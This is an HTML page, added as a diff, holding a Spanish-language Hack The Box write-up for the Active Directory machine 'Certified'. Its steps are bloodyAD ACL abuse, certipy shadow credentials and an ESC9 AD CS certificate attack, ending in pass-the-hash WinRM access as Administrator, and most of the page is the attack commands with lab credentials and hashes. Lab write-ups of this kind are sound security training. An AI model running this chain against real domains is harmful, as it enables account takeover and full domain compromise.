@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Certified HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/certified/pasted-image-20260310012054.png" alt="Certified HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Certified</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>BloodHound</span>
+            <span>GenericAll</span>
+            <span>shadow_credentials</span>
+            <span>AD CS</span>
+            <span>acl</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: BloodHound</li>
+            <li><code>Movimiento lateral</code>: <code>ACLs</code></li>
+            <li><code>Escalada de Privilegios</code>: Certificados <code>AD CS</code> mediante <code>ESC9</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310012303.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>Assumed breach</h3>
+            <pre><code># Credenciales -&gt; judith.mader:judith09</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310013814.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>Convertirnos en propietarios del grupo</h3>
+            <pre><code>bloodyAD --host dc01.certified.htb --dc-ip 10.129.231.186 -d &quot;certified.htb&quot; -u &#x27;judith.mader&#x27; -p &#x27;judith09&#x27; set owner &#x27;Management&#x27; &#x27;judith.mader&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310014446.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>Modificar DACL</h3>
+            <pre><code>bloodyAD --host dc01.certified.htb --dc-ip 10.129.231.186 -d &#x27;certified.htb&#x27; -u &#x27;judith.mader&#x27; -p &#x27;judith09&#x27; add genericAll &#x27;CN=Management,CN=Users,DC=certified,DC=htb&#x27; &#x27;judith.mader&#x27;&#x27;
+# Ver CN en LDAP</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310015052.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>Agregarnos al grupo</h3>
+            <pre><code>bloodyAD -u &#x27;judith.mader&#x27; -p &#x27;judith09&#x27; -d &#x27;certified.htb&#x27; --host 10.129.231.186 add groupMember &#x27;Management&#x27; judith.mader</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310015102.png" alt="Certified HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310013853.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>Shadow credentials</h3>
+            <pre><code>certipy-ad shadow auto -username &#x27;judith.mader&#x27;@&#x27;certified.htb&#x27; -password &#x27;judith09&#x27; -account &#x27;management_svc&#x27;
+# NT Hash: a091c1832bcdd4677c28b5a6a1295584</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310015315.png" alt="Certified HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral</h2>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310013928.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>Cambiar contraseña de ca_operator</h3>
+            <pre><code>nxc smb 10.129.231.186 -u &#x27;management_svc&#x27; -H &#x27;a091c1832bcdd4677c28b5a6a1295584&#x27; -M change-password -o USER=ca_operator NEWPASS=&#x27;pass123&#x27;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310015840.png" alt="Certified HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: ESC9</h2>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310014144.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>Enumerar AD CS vulnerables</h3>
+            <pre><code>certipy-ad find -u &#x27;ca_operator&#x27; -p &#x27;pass123&#x27; -dc-ip 10.129.231.186 -vulnerable</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310020451.png" alt="Certified HTB" />
+          <blockquote>
+            Elegimos un usuario <code>attacker</code> y un usuario <code>victim</code>: <code>management_svc</code> abusa de <code>GenericAll</code> / <code>GenericWrite</code> sobre <code>ca_operator</code>.
+          </blockquote>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310024139.png" alt="Certified HTB" />
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310013928.png" alt="Certified HTB" />
+          <div class="code-card">
+            <h3>1. Agregar a la víctima al UPN del Administrador</h3>
+            <pre><code>certipy-ad account -u &#x27;management_svc@certified.htb&#x27; -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584&#x27; -dc-ip &#x27;10.129.231.186&#x27; -upn &#x27;administrator&#x27; -user &#x27;ca_operator&#x27; update</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>2. Solicitar certificado.pfx para la víctima con la plantilla vulnerable</h3>
+            <pre><code># Solicitar con credenciales de victim
+certipy-ad req -u &#x27;ca_operator&#x27; -p &#x27;pass123&#x27; -dc-ip &#x27;10.129.231.186&#x27; -target &#x27;dc01.certified.htb&#x27; -ca &#x27;certified-DC01-CA&#x27; -template &#x27;CertifiedAuthentication&#x27;
+# Solicitar con kerberos KRB5CCNAME y la flag -k 
+certipy-ad req -k -dc-ip &#x27;10.129.231.186&#x27; -target &#x27;dc01.certified.htb&#x27; -ca &#x27;certified-DC01-CA&#x27; -template &#x27;CertifiedAuthentication&#x27;
+# Obtenemos administrator.pfx</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>3. Revertir el UPN de la víctima</h3>
+            <pre><code>certipy-ad account -u &#x27;management_svc@certified.htb&#x27; -hashes &#x27;aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584&#x27; -user &#x27;ca_operator&#x27; -upn &#x27;ca_operator@certified.htb&#x27; update</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>4. Autenticarnos como administrator para conseguir su hash NTLM</h3>
+            <pre><code>certipy-ad auth -pfx administrator.pfx -domain &#x27;certified.htb&#x27; -dc-ip &#x27;10.129.231.186&#x27;
+# Obtenemos Hash_NTLM de Administrator</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -u &#x27;Administrator&#x27; -H &#x27;0d5b49608bbce1751f708748f67e2d34&#x27; -i dc01</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/certified/pasted-image-20260310023101.png" alt="Certified HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>BloodHound</span>
+            <span>GenericAll</span>
+            <span>shadow_credentials</span>
+            <span>AD CS</span>
+            <span>acl</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
